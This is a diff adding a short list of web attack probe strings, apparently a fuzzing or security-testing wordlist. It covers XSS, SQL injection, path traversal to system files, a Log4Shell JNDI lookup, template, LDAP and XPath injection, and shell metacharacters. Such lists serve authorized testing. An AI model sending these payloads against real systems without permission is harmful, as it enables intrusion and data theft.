@@ -1,0 +1,21 @@
+' " ` \ ; | & && || $ *
+<h1>test</h1>
+<script>alert(1)</script>
+javascript:alert(1)
+'><script>alert(1)</script>
+' OR '1'='1-- -
+' UNION SELECT NULL,NULL--
+WAITFOR DELAY '00:00:05'
+SLEEP(5)
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+%2e%2e%2f
+${jndi:ldap://example.com/a}
+#{7*7}
+${7*7}
+{{7*7}}
+%24%7B7*7%7D
+)(objectClass=*)
+*)(uid=*)
+' or ''='
+'] | //*
